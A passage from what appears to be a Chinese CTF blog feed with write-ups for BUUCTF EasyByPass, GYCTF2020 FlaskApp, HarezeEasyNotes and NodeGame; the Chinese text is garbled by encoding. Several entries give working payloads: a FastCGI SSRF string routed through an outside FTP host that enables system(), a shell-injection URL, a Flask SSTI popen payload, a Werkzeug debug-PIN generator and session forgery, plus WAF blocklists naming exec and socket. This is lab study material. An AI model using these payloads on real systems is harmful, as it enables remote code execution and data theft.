class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> $client-&gt;request($params, $code).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hack.php?file&#x3D;ftp:&#x2F;&#x2F;81.69.201.65:2000&#x2F;&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</span><br></pre></td></tr></table></figure>



<p>ç„¶åæˆ‘åˆå¼¹ä¸å‡ºæ¥shelläº†ï¼Ÿï¼Ÿï¼Ÿ</p>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>PHPç‰¹æ€§</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF_EasyByPass</title>
    <url>/2021/05/12/BUUCTF-EasyByPass/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><p>é—­åˆæ‹¬å·</p>
<p>é¢˜ç›®æ”¾å‡ºæºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$comm1 = $_GET[<span class="string">&#x27;comm1&#x27;</span>];</span><br><span class="line">$comm2 = $_GET[<span class="string">&#x27;comm2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, $comm1))</span><br><span class="line">    $comm1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;</span>, $comm2))</span><br><span class="line">    $comm2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$flag = <span class="string">&quot;#flag in /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">$comm1 = <span class="string">&#x27;&quot;&#x27;</span> . $comm1 . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$comm2 = <span class="string">&#x27;&quot;&#x27;</span> . $comm2 . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">var_dump($comm1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$cmd = <span class="string">&quot;file <span class="subst">$comm1</span> <span class="subst">$comm2</span>&quot;</span>;</span><br><span class="line">var_dump($cmd);</span><br><span class="line">system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼Œéšä¾¿æµ‹äº†ä¸€ä¸‹ã€‚ã€‚æ‰“ï¼Œè¿‡äº†</p>
<p><img src="BUUCTF_EasyByPass/image-20210512202222508.png" alt="image-20210512202222508"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.32.131&#x2F;1.php?comm1&#x3D;&quot;;tac &#x2F;*;&quot;&amp;comm2&#x3D;1</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020FlaskApp</title>
    <url>/2021/05/13/GYCTF2020FlaskApp/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul>
<li>Flask DEbugæ¨¡å¼</li>
<li>SSTI</li>
</ul>
<h1 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h1><p><img src="GYCTF2020FlaskApp/image-20210513224517992.png" alt="image-20210513224517992"></p>
<p>å¤ç°çš„ï¼Œä¸»è¦æ˜¯éœ€è¦åˆ©ç”¨SSTIè·å–å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<ul>
<li><p> cat /etc/passwd ä¸‹çš„å½“å‰ç”¨æˆ·å</p>
</li>
<li><p>modname ä¸€èˆ¬é»˜è®¤ä¸ºflask.app</p>
</li>
<li><pre><code class="python">getattr(app, â€œ__name__â€, app.__class__.__name__)ã€‚pythonè¯¥å€¼ä¸€èˆ¬ä¸ºFlask å€¼ä¸€èˆ¬ä¸å˜
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+ flaskåº“ä¸‹é¢çš„app.py çš„ç»å¯¹è·¯å¾„ï¼Œä¸€èˆ¬æŠ¥é”™ä¿¡æ¯å°±æ³„éœ²äº†</span><br><span class="line"></span><br><span class="line">+ å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶ï¼Œè¯»å–&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address å³å¯å¾—åˆ°</span><br><span class="line"></span><br><span class="line">  åˆ©ç”¨pythonè½¬æ¢æˆåè¿›åˆ¶</span><br><span class="line"></span><br><span class="line">  ![image-20210513224832045](GYCTF2020FlaskApp&#x2F;image-20210513224832045.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æœºå™¨çš„IDï¼š å¯¹äºédockeræœºæ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œlinuxçš„idä¸€èˆ¬å­˜æ”¾åœ¨&#x2F;etc&#x2F;machine-idæˆ–&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_iï¼Œæœ‰çš„ç³»ç»Ÿæ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œwindowsçš„idè·å–è·Ÿlinuxä¹Ÿä¸åŒã€‚</span><br><span class="line"></span><br><span class="line">å¯¹äºdockeræœºåˆ™è¯»å–è¯»å–&#x2F;proc&#x2F;self&#x2F;cgroupè·å–get_machine_id()(dockeråé¢é‚£æ®µå­—ç¬¦ä¸²)ï¼š</span><br><span class="line"></span><br><span class="line">EXP,æŠ“è¿‡æ¥ï¼Œæ‰“</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits &#x3D; [</span><br><span class="line">    &#39;flaskweb&#39;# username</span><br><span class="line">    &#39;flask.app&#39;,# modname</span><br><span class="line">    &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span><br><span class="line">    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # getattr(mod, &#39;__file__&#39;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits &#x3D; [</span><br><span class="line">    &#39;2485377871076&#39;,# str(uuid.getnode()),  &#x2F;sys&#x2F;class&#x2F;net&#x2F;ens33&#x2F;address</span><br><span class="line">    &#39;bad1f6f0683c071acc834769dff047e264024e2f37e2cb6fb1e77c550c4eb15a&#39;# get_machine_id(), &#x2F;etc&#x2F;machine-id</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h &#x3D; hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit &#x3D; bit.encode(&#39;utf-8&#39;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#39;cookiesalt&#39;)</span><br><span class="line"></span><br><span class="line">cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num &#x3D; None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#39;pinsalt&#39;)</span><br><span class="line">    num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv &#x3D;None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size &#x3D;&#x3D; 0:</span><br><span class="line">            rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv &#x3D; num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>




</code></pre>
</li>
</ul>
<h1 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h1><p>æˆ‘è‡ªå·±åšçš„æ—¶å€™æˆ‘æ˜¯ç›´æ¥éé¢„æœŸäº†ï¼Œä½œè€…çš„è¿‡æ»¤ä¸æ˜¯å¾ˆä¸¥æ ¼å¯¼è‡´æˆ‘ç›´æ¥ç»•è¿‡äº†</p>
<h2 id="ssti-æŒ¨ä¸ªæ•´è¿‡å»"><a href="#ssti-æŒ¨ä¸ªæ•´è¿‡å»" class="headerlink" title="ssti æŒ¨ä¸ªæ•´è¿‡å»"></a>ssti æŒ¨ä¸ªæ•´è¿‡å»</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;po&#39;+&#39;pen&#39;](&#39;cat &#x2F;this_is_the_fl[a&#123;1&#125;]g.txt&#39;).read()&#125;&#125;  </span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®æ˜¯è¿‡æ»¤äº†å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span> black_list = [<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;chr&quot;</span>, <span class="string">&quot;request&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;commands&quot;</span>, <span class="string">&quot;socket&quot;</span>, <span class="string">&quot;hex&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;?&quot;</span>]</span><br></pre></td></tr></table></figure>



<p>è¿‡æ»¤äº†? å’Œ * å·ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤ä¸­æ‹¬å·ï¼Œè¦çŸ¥é“ï¼Œåœ¨linuxå½“ä¸­æ˜¯å…è®¸ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¯»å–æ–‡ä»¶çš„,åˆ©ç”¨è¿™ä¸ª</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;songgj&#x2F;p&#x2F;8906005.html</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>HarezeEasyNotes</title>
    <url>/2021/05/14/HarezeEasyNotes/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul>
<li>session ååºåˆ—åŒ–</li>
<li>ä»£ç å®¡è®¡</li>
</ul>
<h1 id="åšé¢˜æ€è·¯ï¼š"><a href="#åšé¢˜æ€è·¯ï¼š" class="headerlink" title="åšé¢˜æ€è·¯ï¼š"></a>åšé¢˜æ€è·¯ï¼š</h1><p>é¢˜ç›®æ˜¯ç»™å‡ºæºç çš„ï¼Œæ¯”è¾ƒå…³é”®çš„ä»£ç åœ¨è¿™é‡Œï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">session_save_path(TEMP_DIR);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>



<p>æˆ‘ä»¬éœ€è¦æ˜ç™½PHPçš„sessionå‚¨å­˜æœºåˆ¶ï¼Œå½“PHPå‚¨å­˜sessionçš„æ—¶å€™ï¼Œä¼šåºåˆ—åŒ–æˆ‘ä»¬çš„ä»£ç ï¼Œå¹¶ä¸”å°†å…¶ä¿å­˜ä¸ºsess_xxxxxç±»å‹çš„æ–‡ä»¶</p>
<p><img src="HarezeEasyNotes/image-20210514173153776.png" alt="image-20210514173153776"></p>
<p>å°±æ¯”å¦‚è¿™é‡Œçš„å€¼ï¼Œå®é™…ä¸Šå°±æ˜¯ç”±phpè¯»å–äº†sess__29af5bb579395528cbc4b72153afb10b æ–‡ä»¶å¾—æ¥ï¼Œè¿™æ—¶phpå°±ä¼šè¯»å–å…¶ä¸­çš„å€¼äº†ã€‚å¦‚æœæˆ‘ä»¬éœ€è¦ä¼ªé€ çš„è¯æˆ‘ä»¬éœ€è¦çŸ¥é“è·¯å¾„</p>
<p>æ ¹æ®init.phpæˆ‘ä»¬å¾—åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">session_save_path(TEMP_DIR);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p>åˆå¯çŸ¥é“ï¼š</p>
<p><img src="HarezeEasyNotes/image-20210514173413851.png" alt="image-20210514173413851"></p>
<p>ä¸‹è½½ä»£ç ä¼šè¯»å–æ–‡ä»¶ï¼Œè€Œæ–‡ä»¶åæ˜¯æ ¹æ®useråå­—æ¥æ§åˆ¶çš„å—ï¼Œè€Œåé¢çš„å†…å®¹åå­—è¯´æ˜¯éšæœºçš„ï¼Œå…¶å®åˆ°å¦é—¨çœ‹å¯ä»¥å‘ç°è¿˜æ˜¯ä¼šè¯»å–å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶- -ï¼Ÿ</p>
<p>è€Œè¯»å†™çš„å†…å®¹é€šè¿‡Â·add_noteå‡½æ•°å¯ä»¥æ§åˆ¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_note</span>(<span class="params">$title, $body</span>) </span>&#123;</span><br><span class="line">  $notes = get_notes();</span><br><span class="line">  array_push($notes, [</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span> =&gt; $title,</span><br><span class="line">    <span class="string">&#x27;body&#x27;</span> =&gt; $body,</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span> =&gt; hash(<span class="string">&#x27;sha256&#x27;</span>, microtime())</span><br><span class="line">  ]);</span><br><span class="line">  $_SESSION[<span class="string">&#x27;notes&#x27;</span>] = $notes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>å†™å…¥å†…å®¹ä¸º</p>
<p>xxxx|N;admin|b:1;xxxxxx</p>
<p>è®¿é—®export.php type=. è¿™æ ·å­å°±å®Œå…¨æ§åˆ¶äº†æ–‡ä»¶å</p>
<p>ä¸‹è½½è¿‡æ¥çš„æ–‡ä»¶ååé¢å°±æ˜¯sessionï¼Œè®¿é—®flagå³å¯</p>
]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>NodeGame</title>
    <url>/2021/05/13/NodeGame/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul>
<li><p>CRLF å¤´éƒ¨æ³¨å…¥</p>
</li>
<li><p>SSRF</p>
</li>
<li><p>PUG æ–‡ä»¶æ‰§è¡Œ</p>
</li>
</ul>
<p>æ€è·¯ï¼š</p>
<p>é¢˜ç›®æ˜¯ç»™å‡ºæºç çš„ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">&#x27;./dist&#x27;</span>&#125;).array(<span class="string">&#x27;file&#x27;</span>));</span><br><span class="line">app.use(morgan(<span class="string">&#x27;short&#x27;</span>));</span><br><span class="line">app.use(<span class="string">&quot;/uploads&quot;</span>,express.static(path.join(__dirname, <span class="string">&#x27;/uploads&#x27;</span>)))</span><br><span class="line">app.use(<span class="string">&quot;/template&quot;</span>,express.static(path.join(__dirname, <span class="string">&#x27;/template&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">&quot;index&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">&quot;/&quot;</span>) || action.includes(<span class="string">&quot;\\&quot;</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">&quot;Errrrr, You have been Blocked&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">&#x27;/template/&#x27;</span>+ action +<span class="string">&#x27;.pug&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/file_upload&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">&quot;only admin&#x27;s ip can use it&quot;</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">            obj.msg = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">&#x27;/uploads/&#x27;</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">&quot;/&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">!fs.existsSync(__dirname + file_path)</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">&quot;file type error&quot;</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">&#x27;upload success&#x27;</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">&#x27;/template/source.txt&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/core&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:8081/source?&#x27;</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    resp.on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">&quot;ECONNRESET&quot;</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">&quot;Timeout occurs&quot;</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">&quot;global&quot;</span>, <span class="string">&quot;process&quot;</span>,<span class="string">&quot;mainModule&quot;</span>,<span class="string">&quot;require&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;child_process&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;!&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>å®¡è®¡æºç ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„æ˜¯è¿›å…¥file_uploadç›®å½•ä¸‹ä¼ ä¸ªæ–‡ä»¶ã€‚é¢˜ç›®æ˜¯å¼•å…¥äº†pugæ’ä»¶çš„</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;xiaohuochai&#x2F;p&#x2F;7222227.html</span><br></pre></td></tr></table></figure>

<p>è¯¥æ’ä»¶å…è®¸æ’å…¥JSä»£ç ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å…è®¸JS</p>
<p>CRLFçš„é—®é¢˜ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2894</span><br></pre></td></tr></table></figure>





<p>EXPï¼š</p>
